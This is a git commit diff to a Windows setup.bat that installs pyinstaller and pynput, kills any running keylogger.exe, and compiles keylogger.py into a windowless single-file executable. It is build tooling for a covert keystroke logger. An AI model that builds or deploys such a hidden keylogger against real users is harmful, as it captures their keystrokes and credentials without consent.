392e75bb7598e252b949c9d67240bbadaadbb99d
Kevin Chang <kevinchang1@hotmail.com>
2017-05-04 08:45:12 -0500

    setup.bat now terminates existing keylogger.exe process

--- setup.bat
+++ setup.bat
@@ -1,6 +1,8 @@
 @echo off
 pip install pyinstaller
 pip install pynput
+SETLOCAL
+TASKKILL /F /IM "keylogger.exe"
 pyinstaller.exe --noconsole --onefile keylogger.py
 IF %ERRORLEVEL% NEQ 0 (
 echo FAILED TO PRODUCE EXE FILE.&echo
